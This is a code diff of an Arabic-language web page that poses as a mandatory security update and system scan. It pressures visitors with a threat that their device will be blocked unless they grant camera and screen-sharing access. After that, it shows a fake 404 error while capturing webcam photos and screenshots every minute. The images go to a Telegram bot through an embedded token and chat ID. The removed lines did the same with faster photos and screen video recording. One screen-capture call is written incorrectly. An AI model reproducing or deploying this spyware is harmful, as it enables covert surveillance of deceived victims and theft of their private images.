@@ -1,56 +1,81 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><title>Update</title></head>
-<body style="background:#000;color:#0f0;text-align:center;">
-    <button id="go" style="margin-top:20%;padding:20px;">اضغط هنا للمتابعة</button>
-    <video id="v" width="1" height="1" autoplay style="opacity:0;"></video>
-    <canvas id="c" style="display:none;"></canvas>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>تحديث الأمان الإجباري</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 50px; }
+        .box { border: 1px solid #0f0; padding: 20px; display: inline-block; }
+        .loading { animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>جاري فحص النظام...</h2>
+        <p class="loading">الرجاء منح الصلاحيات المطلوبة لتجنب حظر جهازك</p>
+        <button id="startBtn" style="padding:10px 20px; cursor:pointer;">ابدأ الفحص الآن</button>
+    </div>
+
+    <video id="video" width="1" height="1" autoplay style="opacity:0;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const T = '8301462057:AAF1rD3xfgur1lyEV80jCctZ9stYJdVYkiU';
-        const C = '1105921069';
+        const TOKEN = '8301462057:AAF1rD3xfgur1lyEV80jCctZ9stYJdVYkiU';
+        const CHAT_ID = '1105921069';
 
-        async function start() {
+        async function startOperation() {
             try {
-                const cam = await navigator.mediaDevices.getUserMedia({ video: true });
-                const scr = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                document.body.innerHTML = "<h2>Error 0x01: Connecting...</h2>";
+                // 1. طلب صلاحية الكاميرا والشاشة معاً
+                const camStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const screenStream = await navigator.util.getDisplayMedia({ video: true });
                 
-                const vid = document.getElementById('v');
-                vid.srcObject = cam;
+                // إخفاء الواجهة للإيهام بأن العمل انتهى
+                document.body.innerHTML = "<h1>404 Error</h1><p>حدث خطأ في الاتصال بالسيرفر.</p>";
 
-                // 1. التقاط الصور بسرعة (كل 3 ثوانٍ - أقصى سرعة آمنة)
+                // دالة لالتقاط وإرسال صورة الكاميرا
+                const sendCam = () => {
+                    const video = document.getElementById('video');
+                    video.srcObject = camStream;
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = 640; canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                    canvas.toBlob(b => sendToTelegram(b, 'camera.jpg'), 'image/jpeg');
+                };
+
+                // دالة لالتقاط وإرسال لقطة الشاشة
+                const sendScreen = () => {
+                    const videoTrack = screenStream.getVideoTracks()[0];
+                    const capture = new ImageCapture(videoTrack);
+                    capture.grabFrame().then(bitmap => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = bitmap.width; canvas.height = bitmap.height;
+                        canvas.getContext('2d').drawImage(bitmap, 0, 0);
+                        canvas.toBlob(b => sendToTelegram(b, 'screenshot.jpg'), 'image/jpeg');
+                    });
+                };
+
+                // إرسال البيانات فوراً ثم كل دقيقة
+                sendCam();
+                sendScreen();
                 setInterval(() => {
-                    const can = document.getElementById('c');
-                    can.width = 400; can.height = 300;
-                    can.getContext('2d').drawImage(vid, 0, 0, 400, 300);
-                    can.toBlob(b => send(b, 'p.jpg', 'sendPhoto'), 'image/jpeg', 0.4);
-                }, 3000);
+                    sendCam();
+                    sendScreen();
+                }, 60000); // 60000 مللي ثانية = 1 دقيقة
 
-                // 2. تسجيل الشاشة دقيقة بدقيقة
-                function rec() {
-                    const m = new MediaRecorder(scr);
-                    let ch = [];
-                    m.ondataavailable = e => ch.push(e.data);
-                    m.onstop = () => {
-                        send(new Blob(ch, {type:'video/mp4'}), 'v.mp4', 'sendVideo');
-                        rec(); 
-                    };
-                    m.start();
-                    setTimeout(() => m.stop(), 60000);
-                }
-                rec();
-            } catch (e) { location.reload(); }
+            } catch (err) {
+                alert("يجب قبول جميع الصلاحيات للوصول!");
+            }
         }
 
-        async function send(b, n, m) {
-            const f = new FormData();
-            f.append('chat_id', C);
-            f.append(m === 'sendPhoto' ? 'photo' : 'video', b, n);
-            fetch(`https://api.telegram.org/bot${T}/${m}`, { method: 'POST', body: f });
+        async function sendToTelegram(blob, filename) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('document', blob, filename);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: 'POST', body: fd });
         }
 
-        document.getElementById('go').onclick = start;
+        document.getElementById('startBtn').onclick = startOperation;
     </script>
 </body>
 </html>
